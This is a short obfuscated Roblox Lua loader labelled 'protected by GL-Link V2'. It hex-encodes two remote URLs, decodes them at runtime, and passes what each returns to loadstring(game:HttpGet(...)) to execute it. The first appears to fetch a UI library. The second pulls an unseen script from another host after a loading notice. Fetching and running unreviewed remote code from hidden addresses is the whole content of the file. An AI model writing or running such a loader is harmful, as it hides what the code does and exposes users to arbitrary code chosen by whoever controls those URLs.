--This file is protected by GL-Link V2
(function()
    local _={_G,table,string}local a=_[1]local b=_[2]local c=_[3]
    local d=a.loadstring or a.load
    local e="68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f346c706163612d70696e2f436f6d704b696c6c65722f726566732f68656164732f6d61696e2f7372632f736f757263652e6c756175"
    local f=function(g)local h=""for i=1,#g,2 do h=h..c.char(tonumber(g:sub(i,i+1),16))end;return h end
    local j=d(a.game:HttpGet(f(e)))()
    local k=j.newNotify()
    j:Loader("rbxassetid://120245531583106",3.698745).yield()
    local l="68747470733a2f2f7261772e6769742e636f6d2f4f414f2d4b616d752f492f6d61696e2f412e4c756175"
    d(a.game:HttpGet(f(l)))()
end)()
